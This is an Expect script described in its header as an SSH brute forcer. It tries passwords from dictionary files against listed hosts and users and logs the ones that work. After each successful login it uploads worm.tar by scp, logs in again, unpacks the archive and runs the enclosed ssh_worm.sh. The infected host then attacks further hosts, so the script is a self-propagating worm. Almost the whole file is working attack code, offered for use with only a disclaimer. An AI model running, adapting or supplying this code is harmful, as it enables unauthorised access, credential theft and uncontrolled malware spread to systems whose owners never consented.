#!/usr/bin/expect -f
#
#    Written by James Shanahan(jshanahan@comcastpc.com)
#    and Erin Palmer(epalmer@comcastpc.com)
#    ssh brute forcer
#    This will alow you to specify hosts, password lists, and a user
#    I do not take any reponsibilty for what you do with this tool
#    Hopefully it will make your life easier rather then making other
#    peoples lives more difficult!

set timeout 1000

if {[llength $argv] != 3} {
   puts stderr "Usage: $argv0 <dictionary-file> <hosts-file> <user-file>\n"
   exit
}

set dictionary [lindex $argv 0]
set file [lindex $argv 1]
set user [lindex $argv 2]



set tryHost [open $file r]
set tryPass [open $dictionary r]
set tryUser [open $user r]

set passwords [read $tryPass]
set hosts [read $tryHost]
set login [read $tryUser]

spawn $env(SHELL)


proc after_login {ip username passwd} {
    # after login, this exits, sends a compressed file to the server
    send "exit\n"
    expect -- "\$ "
    send -- "scp ./worm.tar $username@$ip:~\n"
    expect -nocase "password: "
    send -- "$passwd\n"
    # After successfully sending the file, this uncompress and executes it.
    expect -- "\$ "
    send -- "ssh $username@$ip\n"
    expect -nocase "password: "
    send -- "$passwd\n"
    expect {
        "\$ " {
            send -- "tar xvf worm.tar worm\n"
            expect -- "\$ "
            send -- "expect worm/ssh_worm.sh worm/dict.txt worm/host.txt worm/user.txt 2>&1 > worm.log\n"
            expect -- "\$ "
            send -- "exit\n"
        }
        -nocase "password: " {
            puts stderr "\n\ninvalid password for scp\n\n"
        }
    }
}

foreach username $login {
    foreach passwd $passwords {
        foreach ip $hosts {
#            puts stderr "execute ssh"
            expect "\$ "
            send -- "ssh $username@$ip\n"
            expect {
                # some sshd response with "Password:" and others with "password:"
                -nocase "password: "  {
#                    puts stderr "start to interaction\n"
                    send -- "$passwd\n"
                    expect {
                        "\$ " {
                            set logFile [open $ip.log a]
                            puts $logFile "password for $username@$ip is $passwd"
                            close $logFile
                            after_login $ip $username $passwd
                        }
                        -nocase "password: " {
                            puts stderr "incorrect password"
                            send -- ""
#                            close
#                            set id [exp_pid]
#                            exec kill -KILL $id
#                            wait
                        }
                    }
                }
                "(yes/no)? " {
                    send "yes\n"
                    exp_continue
                }
                "Connection closed by remote host" {
                    close
                    wait
                }
            }
        }
    }
}

